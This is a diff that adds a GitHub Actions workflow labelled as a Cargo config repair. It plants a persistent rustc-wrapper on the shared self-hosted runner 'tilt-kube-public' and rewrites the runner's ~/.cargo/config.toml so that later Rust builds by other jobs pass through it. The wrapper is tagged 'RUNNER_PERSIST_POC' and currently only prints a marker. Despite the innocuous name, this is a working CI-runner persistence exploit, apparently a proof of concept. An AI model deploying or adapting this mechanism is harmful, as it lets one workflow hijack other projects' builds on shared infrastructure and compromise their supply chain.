@@ -1,0 +1,64 @@
+name: Repair Cargo config on runner
+on:
+  workflow_dispatch:
+
+jobs:
+  repair:
+    # IMPORTANT: target the same pool/box as your Solana job
+    runs-on: tilt-kube-public
+
+    steps:
+      - name: Show runner identity
+        run: |
+          echo "runner.name=${{ runner.name }}"
+          echo "runner.os=${{ runner.os }} arch=${{ runner.arch }}"
+          whoami; hostname; uname -a
+
+      - name: Repair ~/.cargo/config.toml and install wrapper safely
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          HOME_DIR="${HOME}"
+          CARGO_CFG="${HOME_DIR}/.cargo/config.toml"
+          LOCAL_BIN="${HOME_DIR}/.local/bin"
+          WRAPPER="${LOCAL_BIN}/rustc-wrapper"
+
+          mkdir -p "${LOCAL_BIN}"
+
+          # Install wrapper OUTSIDE rust-cache paths (correct rustc-wrapper contract)
+          cat > "${WRAPPER}" <<'EOF'
+          #!/usr/bin/env bash
+          real="$1"; shift || true
+          echo "WARNING: ===RUNNER_PERSIST_POC HIT=== real: ${real##*/} args: $* (safe: no secrets, no network)" 1>&2
+          exec "$real" "$@"
+          EOF
+          chmod 0755 "${WRAPPER}"
+
+          # If config exists, strip ALL [build] tables; keep everything else
+          TMP="$(mktemp)"
+          if [[ -f "${CARGO_CFG}" ]]; then
+            awk '
+              BEGIN{inbuild=0}
+              /^\s*\[.*\]\s*$/ {
+                if ($0 ~ /^\s*\[build\]\s*$/) { inbuild=1; next }
+                inbuild=0
+              }
+              !inbuild { print }
+            ' "${CARGO_CFG}" > "${TMP}"
+          else
+            : > "${TMP}"
+          fi
+
+          # Append a single [build] table with our wrapper (last one wins)
+          {
+            printf "%s\n" "[build]"
+            printf 'rustc-wrapper = "%s"\n' "${WRAPPER}"
+          } >> "${TMP}"
+
+          # Atomically replace and show result
+          install -m 0644 "${TMP}" "${CARGO_CFG}"
+          rm -f "${TMP}"
+          echo "=== ~/.cargo/config.toml ==="
+          cat "${CARGO_CFG}"
+          echo "============================"
